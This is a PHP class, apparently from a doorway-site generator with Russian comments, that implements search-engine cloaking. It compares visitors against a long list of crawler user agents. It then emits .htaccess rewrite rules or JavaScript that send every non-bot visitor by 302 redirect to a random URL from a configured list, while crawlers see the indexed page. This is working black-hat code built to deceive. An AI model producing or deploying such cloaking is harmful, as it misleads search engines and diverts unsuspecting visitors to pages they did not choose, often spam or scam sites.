<?php
//+------------------------------------------------------------------+
//|                  Copyright c 2012, RedButton Web Sites Generator |
//|                                      http://www.getredbutton.com |
//+------------------------------------------------------------------+
/**
 * Работа с клоакингом
 */
class CModel_cloaking
  {
  /**
   * Боты
   * @var string
   */
  private $m_bots = 'crawl|magpie|MLBot|larbin|unspecified|Googlebot|Slurp|YandexBot|Yandex|msnbot|GurujiBot|GingerCrawler|CommentReader|NetcraftSurveyAgent|Exabot|TailsweepBlogCrawler|Tailsweep|SurveyBot|Sogou|Spiders|Zipping|Along|BlogShares|OOZBOT|SNAPSHOT|DotBot|discobot|psbot|Twiceler|MJ12bot|Charlotte|heritrix|Combine|boitho|e-SocietyRobot|OmniExplorer|Zealbot|Gaisbot|Nutch|DigE|Galbot|Mp3Bot|x2YZSEO|SAPE.BOT|DKIMRepBot|robotgenius|Sosospider|Enterprise|Baiduspider|UniversalFeedParser|Baidu';
  /**
   * параметры
   * @var array
   */
  private $m_params;
  /**
   * ссылки в виде массива
   * @var string
   */
  private $m_redirect_url_array = array();
  /**
   * Случайный урл для редиеркта
   * @var string
   */
  private $m_redirect_url_rand = '';
  /**
   * Тип редиректа
   * @var string
   */
  private $m_redirect_type;
  /**
   * URL редиректа
   * @var string
   */
  private $m_redirect_url;

  /**
   * @param $params
   */
  public function __construct(&$params)
    {
    $this->m_params       = $params;
    $this->m_redirect_url = $this->m_params['redirectLink'];
    $this->InitArrayUrls();
    }

  /**
   * Получение строки для файла .Htaccess
   * @return string
   */
  public function GetForHtaccess(&$data)
    {
    if(isset($this->m_params['cloakingType']) && $this->m_params['cloakingType'] == 'htaccess')
      {
      if(strpos($data, 'RewriteEngine') === FALSE) $data .= 'RewriteEngine on' . "\r\n";
      //---
      $data .= "\r\nRewriteCond %{HTTP_USER_AGENT} !(" . $this->m_bots . ") [NC]";
      $data .= "\r\n" . 'RewriteRule ^(.*)$ ' . ($this->GetRandRedirectUrl()) . ' [R=302,L]' . "\r\n";
      /*$ar = explode('|', $this->m_bots);
      if(!empty($ar))
        {
        foreach($ar as $bot)
          {
          $data .= "\r\nRewriteCond %{HTTP_USER_AGENT} " . $bot . " [NC]";
          }
        //$data = rtrim($data, "[OR]");
        $data = rtrim($data, "[NC]");
        $data .= "[NC]";
        }
      //---
      $data .= "\r\n" . 'RewriteRule ^(.*)$ ' . ($this->GetRandRedirectUrl()) . ' [R=302,L]' . "\r\n";
      */
      }
    //---
    return '';
    }

  /**
   * Инцилизация списка урлов для редиректа
   */
  private function InitArrayUrls()
    {
    $this->m_redirect_url_array = array();
    $urls                       = explode("\n", $this->m_redirect_url);
    foreach($urls as $u)
      {
      $ur = trim($u);
      if(empty($ur)) continue;
      $this->m_redirect_url_array[] = $ur;
      }
    }

  /**
   * Текст функции для определения поискового бота
   * @return string
   */
  public function GetForJavascript()
    {
    if($this->IsTypeJs())
      {
      $ar   = explode('|', $this->m_bots);
      $data = '';
      //---
      foreach($ar as $bot)
        {
        $data .= (!empty($data) ? ' && ' : '') . ("s.indexOf('" . strtolower($bot) . "') == -1");
        }
      return "var s = navigator.userAgent; if(!s || s==undefined) return false; s=s.toLowerCase(); return " . $data;
      }
    //---
    return 'return true;';
    }

  /**
   * Получаем случайный урл
   * @return string
   */
  private function GetRandRedirectUrl()
    {
    if(empty($this->m_redirect_url_array)) return '';
    return $this->m_redirect_url_array[array_rand($this->m_redirect_url_array)];
    }

  /**
   * Это тип клоакинга через яваскрипт?
   * @return bool
   */
  public function IsTypeJs()
    {
    return isset($this->m_params['cloakingType']) && $this->m_params['cloakingType'] == 'js';
    }

  /**
   * Это тип клоакинга через PHP?
   * @return bool
   */
  public function IsTypePhp()
    {
    return isset($this->m_params['cloakingType']) && $this->m_params['cloakingType'] == 'php';
    }
  }

?>